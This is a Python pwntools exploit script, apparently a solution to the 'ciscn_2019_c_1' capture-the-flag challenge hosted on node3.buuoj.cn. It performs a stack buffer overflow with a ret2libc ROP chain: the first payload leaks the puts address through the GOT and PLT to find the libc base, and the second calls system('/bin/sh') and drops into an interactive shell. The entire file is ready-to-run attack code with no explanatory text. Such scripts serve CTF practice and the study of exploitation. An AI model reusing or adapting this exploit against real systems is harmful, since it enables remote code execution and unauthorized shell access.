import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./ciscn_2019_c_1')
	elf=ELF('./ciscn_2019_c_1')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else :
	io=remote('node3.buuoj.cn',26267)
	elf=ELF('./ciscn_2019_c_1')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
pop_rdi_addr=0x400c83
pay='\x00'*0x58+p64(0x400c83)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(elf.sym['main'])
io.recv()
io.sendline('1')
io.recv()
io.sendline(pay)
io.recv(0xc)
puts_addr=u64(io.recv(6)+'\x00\x00')
success('puts_addr:'+hex(puts_addr))
libc_base=puts_addr-libc.sym['puts']
success('libc_base'+hex(libc_base))
pay='\x00'*0x58+p64(0x400c83)+p64(libc_base+libc.search('/bin/sh\x00').next())+p64(libc_base+libc.sym['system'])+p64(elf.sym['main'])
io.recv()
io.sendline('1')
io.recv()
io.sendline(pay)






# gdb.attach(io)
# pause()

io.interactive()